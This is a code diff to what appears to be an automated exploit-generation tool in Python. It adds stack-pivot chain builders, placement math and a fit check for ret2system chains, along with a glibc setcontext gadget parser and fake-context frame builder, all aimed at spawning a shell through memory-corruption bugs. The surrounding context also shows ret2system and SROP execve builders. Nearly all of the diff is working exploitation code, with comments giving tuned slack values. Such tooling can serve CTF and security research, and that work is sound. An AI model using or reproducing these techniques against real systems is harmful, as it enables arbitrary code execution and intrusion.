@@ -285,6 +285,95 @@ def resolve_plt(exe_path, name: str):
     return int(m.group(1), 16) if m else None
 
 
+#: How much room the chain leaves BELOW itself and the alignment it lands on -- both measured, and
+#: the reason is worth keeping: the pivoted stack is not a place to read words from, it IS the
+#: stack, and every function the chain calls grows down into it.
+#:
+#: Two failures taught the number. With the chain at the buffer's START the pivot worked, `pop rdi`
+#: and `system@plt` both ran, and the process died inside `_dl_runtime_resolve_xsavec` -- the lazy
+#: PLT resolver needs hundreds of bytes below the call and a 64-byte-aligned save area. With the
+#: slot pre-resolved and the chain placed high, `system()` ITSELF still needed room: measured
+#: across buffer sizes, 192, 448 and 960 bytes of slack all segfaulted and 1984 spawned a shell.
+#:
+#: And the space that counts is WRITABLE MEMORY BELOW THE CHAIN, not space inside the buffer: a
+#: 256-byte buffer with 8 KiB of other globals underneath works, because the stack keeps growing
+#: past the buffer's start into whatever is mapped writable there. A buffer at the very bottom of
+#: .data does not, however big it is -- the stack runs off into read-only memory.
+_PIVOT_SLACK = 0x800
+_PIVOT_ALIGN = 0x10
+
+
+def pivot_placement(buf_addr: int, buf_len: int, *, slack: int = _PIVOT_SLACK,
+                    align: int = _PIVOT_ALIGN):
+    """Where in a writable buffer to put the pivoted chain, or None when the buffer is too small.
+
+    Returns `(chain_addr, offset_in_buffer)`. The chain goes as high as the slack allows so the
+    callees have stack below it, and on `align` so an `xsavec` in the resolver does not fault."""
+    if buf_len < 0x40:
+        return None                                    # no room for a chain and any slack at all
+    room = min(slack, max(0, buf_len - 0x40))
+    addr = (buf_addr + room) & ~(align - 1)
+    off = addr - buf_addr
+    if off <= 0 or off >= buf_len:
+        return None
+    return addr, off
+
+
+def build_pivot_chain(offset: int, pivot: dict, stage2_addr: int, stage2: list,
+                      *, saved_rbp_slot: bool = True) -> tuple:
+    """A TWO-STAGE chain for an overflow too short to hold one.
+
+    The engine already recovers the offset to the saved return address, and when only a word or two
+    follows it the honest verdict today is an L2 primitive with no L3: a ret2libc chain is three or
+    four words and does not fit. A pivot moves the stack instead of filling it.
+
+    Returns `(stage1, stage2_bytes)`:
+
+      * `stage1` is what the SHORT overflow writes -- filler, then (for `leave; ret`) the saved RBP
+        the gadget will consume, then the gadget itself. Two words past the return address is
+        enough, which is the whole point.
+      * `stage2_bytes` is the chain, written wherever the attacker can put bytes (the same buffer,
+        an earlier field, an environment variable): `leave; ret` sets `rsp = rbp + 8`, so the saved
+        RBP is `stage2_addr - 8` and execution continues straight into the words that follow.
+
+    The other pivots take their destination differently and the caller supplies it: `pop rsp; ret`
+    reads the new stack pointer from the next word, so stage1 is `[pop_rsp][stage2_addr]`;
+    `add rsp, N; ret` steps forward into bytes the same write already placed."""
+    kind = pivot.get("kind")
+    if kind == "rbp" and saved_rbp_slot:
+        # `leave; ret` consumes the SAVED RBP, which sits one word BELOW the return address --
+        # `offset` is the distance to the return address itself (what `recover_ip_offset` yields),
+        # so the filler stops 8 bytes short and the gadget goes in the return slot. Getting this
+        # one slot late writes the RBP value INTO the return slot: the program returns to the
+        # buffer address itself and segfaults, which is what the first hand-proof did.
+        body = bytearray(_cyclic(max(0, offset - 8)))
+        body += struct.pack("<Q", (stage2_addr - 8) & 0xFFFFFFFFFFFFFFFF)   # saved rbp
+        body += struct.pack("<Q", int(pivot["va"]) & 0xFFFFFFFFFFFFFFFF)    # return address
+    elif kind == "stack":
+        body = bytearray(_cyclic(offset))
+        # `pop rsp; ret`: the next word IS the new stack pointer.
+        body += struct.pack("<Q", int(pivot["va"]) & 0xFFFFFFFFFFFFFFFF)
+        body += struct.pack("<Q", stage2_addr & 0xFFFFFFFFFFFFFFFF)
+    else:
+        body = bytearray(_cyclic(offset))
+        body += struct.pack("<Q", int(pivot["va"]) & 0xFFFFFFFFFFFFFFFF)
+    s2 = bytearray()
+    for word in stage2:
+        s2 += struct.pack("<Q", int(word) & 0xFFFFFFFFFFFFFFFF)
+    return bytes(body), bytes(s2)
+
+
+def pivot_fits(offset: int, overflow_len: int, *, words_needed: int = 4) -> bool:
+    """Does the overflow have room for a CHAIN, or only for a pivot?
+
+    `words_needed` is the shortest useful finisher (a ret2system is `[ret][pop rdi][&/bin/sh]
+    [system]`). When the write reaches the saved return address but carries fewer words than that,
+    the chain cannot be placed there at any offset and the pivot is not an optimisation -- it is
+    the only route."""
+    room = max(0, overflow_len - offset) // 8
+    return room >= words_needed
+
+
 def build_ret2system(offset: int, pop_rdi: int, binsh: int, system: int, length: int,
                      ret_gadget=None) -> bytes:
     """cyclic filler, then: [ret align] ; pop rdi ; &"/bin/sh" ; system."""
@@ -1363,3 +1452,102 @@ def build_srop_execve_plant(offset: int, *, syscall: int, rax15, writable: int,
     frame1 = sigreturn_frame(rip=syscall, rax=0, rdi=0, rsi=writable, rdx=count, rsp=writable)
     stage1 = bytes(_cyclic(offset)) + _set_rax15() + frame1
     return stage1, stage2
+
+
+# --- setcontext: every register from one structure ----------------------------------------------
+#: `mov <reg>, [rdx+disp]` encodings. REX.W (0x48) selects rax..rdi, REX.W|REX.R (0x4c) r8..r15;
+#: opcode 0x8b; modrm rm=010 (rdx) with mod=01 (disp8) or mod=10 (disp32). Parsed rather than
+#: matched against a fixed table because WHICH register sits at WHICH context offset is a property
+#: of the glibc in front of us -- and the entry point moved once already (glibc 2.29 switched the
+#: structure pointer from rdi to rdx, which is why the famous offset is "+61" on one version and
+#: something else on the next).
+_SETCTX_REGS = ("rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi")
+
+
+def find_setcontext(libc_data: bytes) -> dict:
+    """`setcontext`'s usable entry and the context offset each register is loaded from, or {}.
+
+    Returns `{"sym", "entry", "fields": {reg: offset}, "rip_at"}` -- all libc-relative, so a
+    leaked base relocates them. The ENTRY is deliberately not `setcontext` itself: the function
+    starts with a `rt_sigprocmask` syscall and then `fldenv [rcx]` / `ldmxcsr [rdx+...]`, which
+    fault unless the context carries a valid FPU environment. Entering at the first
+    `mov rsp, [rdx+...]` skips both and is what every use of this technique actually jumps to.
+
+    `rip_at` is the offset whose word `setcontext` PUSHES before returning -- i.e. where execution
+    continues. Found as the `mov rcx, [rdx+disp]` immediately before the `push rcx` rather than
+    assumed, for the same reason as the rest.
+    """
+    syms = libc_symbols(libc_data, ("setcontext",))
+    base = syms.get("setcontext")
+    if base is None:
+        return {}
+    segs = _loads(libc_data)
+    off = None
+    for f_off, sz, va, _fl in segs:
+        if va <= base < va + sz:
+            off = f_off + (base - va)
+            break
+    if off is None:
+        return {}
+    window = libc_data[off:off + 512]
+    fields: dict = {}
+    entry = None
+    rip_at = None
+    i = 0
+    while i < len(window) - 4:
+        rex = window[i]
+        if rex not in (0x48, 0x4C) or window[i + 1] != 0x8B:
+            if window[i] == 0xC3 and fields:              # ret: the load sequence is over
+                break
+            i += 1
+            continue
+        modrm = window[i + 2]
+        if (modrm & 0x07) != 0x02:                        # rm must be rdx
+            i += 1
+            continue
+        mod = modrm >> 6
+        reg = (modrm >> 3) & 0x07
+        name = _SETCTX_REGS[reg] if rex == 0x48 else f"r{8 + reg}"
+        if mod == 0x01:
+            disp = window[i + 3]
+            step = 4
+        elif mod == 0x02:
+            disp = int.from_bytes(window[i + 3:i + 7], "little")
+            step = 7
+        else:
+            i += 1
+            continue
+        if name == "rsp" and entry is None:
+            entry = base + i                              # the first rsp load: the usable entry
+        if entry is not None:
+            # `push rcx` (0x51) right after a `mov rcx,[rdx+d]` marks the continuation address.
+            if name == "rcx" and window[i + step:i + step + 1] == b"\x51":
+                rip_at = disp
+            else:
+                fields.setdefault(name, disp)
+        i += step
+    if entry is None or "rsp" not in fields:
+        return {}
+    return {"sym": base, "entry": entry, "fields": fields, "rip_at": rip_at}
+
+
+def build_setcontext_frame(fields: dict, rip_at, *, rip: int, rsp: int, rdi: int = 0,
+                           rsi: int = 0, rdx: int = 0, rcx: int = 0, size: int = 0x100) -> bytes:
+    """The fake context `setcontext` reads: one structure, every register.
+
+    Only the offsets this libc actually loads are written, so the frame cannot claim a register
+    the installed `setcontext` does not restore. `rip` is the continuation address (the word the
+    function pushes) and `rsp` the stack it switches to -- together they make this a register-load
+    AND a pivot, which is why it finishes a one-write primitive that has no stack control at all.
+    """
+    buf = bytearray(b"\x00" * max(size, (max(list(fields.values()) + [rip_at or 0]) + 8)))
+
+    def _w(at, val):
+        if at is not None and 0 <= at <= len(buf) - 8:
+            buf[at:at + 8] = struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)
+
+    _w(fields.get("rsp"), rsp)
+    _w(rip_at, rip)
+    for name, val in (("rdi", rdi), ("rsi", rsi), ("rdx", rdx), ("rcx", rcx)):
+        _w(fields.get(name), val)
+    return bytes(buf)
